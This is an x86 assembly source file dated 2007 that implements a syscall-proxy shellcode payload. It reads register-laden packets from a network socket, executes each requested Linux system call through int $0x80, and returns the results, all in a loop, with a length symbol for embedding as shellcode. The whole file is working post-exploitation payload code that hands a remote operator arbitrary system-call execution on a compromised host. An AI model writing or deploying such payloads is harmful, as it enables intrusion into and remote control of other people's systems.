.code32
.global	process_syscall, len_shcode

# th0rpe - 08-27-2007

process_syscall:

#ifdef LISTENER_TCP
#include "listeners/lis_socket_tcp.S"
#else
/* for testing you must compile with 'test_srv.c' */
#include "listeners/getsock.S"
#endif

# save connection descriptor
	pushl %ebx

# alloc space for syscalls packet
	subl $2048, %esp

# write buffer address
write_buffer:
	movl %esp, %ecx

	movl %esp, (%ecx)
	movl $4, %edx
	movl %edx, %eax
	int $0x80

read_request:
	# read request
	movl %esp, %ecx
	movl $2048, %edx
	movl $3, %eax
	int $0x80

	# check minimal length
	cmpl $32,%eax
	jl err_process

	# exec syscall
	popal
exec_syscall:
	int $0x80

	# restore stack pointer
	subl $32, %esp

	# save eax result
	movl %eax, 28(%esp)

# write response
	movl %esp, %ecx
	movl $2048, %edx
# restore ebx register with connecion descriptor
	movl 2048(%esp), %ebx
	movl $4, %eax
	int $0x80

jmp read_request

err_process:
	movl $0xfc,%eax
	int $0x80

len_shcode:
	.long len_shcode - process_syscall
